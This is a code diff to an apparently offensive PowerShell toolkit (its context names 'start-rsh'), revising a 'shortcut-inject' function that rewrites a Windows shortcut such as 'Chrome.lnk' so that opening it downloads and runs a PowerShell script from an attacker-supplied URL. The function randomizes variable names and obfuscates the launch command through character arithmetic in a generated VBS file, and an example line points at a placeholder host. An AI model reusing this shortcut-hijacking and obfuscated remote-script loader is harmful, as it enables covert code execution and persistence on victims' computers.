@@ -227,29 +227,32 @@ function start-rsh
         }
 
 
-	#[->] requires the name of the shortcut along with a url hosting your PS script
-	#[->] example: shortcut-inject "Chrome.lnk" "https://your-domain.com/ps-script"
-	function shortcut-inject { 
+#[->] requires the name of the shortcut along with a url hosting your PS script
+#[->] example: shortcut-inject "Chrome.lnk" "https://your-domain.com/ps-script"
+function shortcut-inject { 
 
-		[CmdletBinding()] Param(
+	[CmdletBinding()] Param(
 	
-		[Parameter(Position=0, Mandatory = $true)]
-		[String]
-		$shortcut,
+	[Parameter(Position=0, Mandatory = $true)]
+	[String]
+	$shortcut,
 	
-		[Parameter(Position=1, Mandatory = $true)]
-		[String]
-		$scriptUrl
+	[Parameter(Position=1, Mandatory = $true)]
+	[String]
+	$scriptUrl
 
-		)
+	)
 	
-		# [->] internal function for variable name randomization
+	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) { 
+	
+	
+		#[->] internal function for variable name randomization
 		function rand-str { 
-
-		$rint = get-random -max 10 -min 3
-		$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
-		1..$rint | % { $rchr += $charArray | get-random }
-		$randstr = [string]::join("", ($rchr))
+	
+			$rint = get-random -max 10 -min 3
+			$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
+			1..$rint | % { $rchr += $charArray | get-random }
+			$randstr = [string]::join("", ($rchr))
 		
 			return $randstr	
 		}
@@ -291,7 +294,6 @@ function start-rsh
 		#[->] Obfuscate first wscript command string
 		$cmdstrArray = @()
 		[int]$ccnt = '1'
-
 		foreach ( $char in $cmdstring.GetEnumerator() ) {
 
 			#[->] translate to ascii value then do math ops on it
@@ -333,7 +335,7 @@ function start-rsh
 				$vbsfile += $newline
 				$vbsfile += $mainRvar + ' = ' + $randvar 
 		
-			} else 	{
+			} else {
 		
 				$vbsfile += ' + ' + $randvar 
 		
@@ -391,10 +393,11 @@ function start-rsh
 		$newShortcut.Save();
 	
 		# write-output "[+] Icon location: $newIcon"
-		returnt "[+] finished injecting command string into shorcut."
+		write-output "[+] finished injecting command string into shortcut."
 
-	}
+	} else { write-output "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script" }
 
+}
 
 	# action = hide or clear
 	# key = encrpytion or decryption string
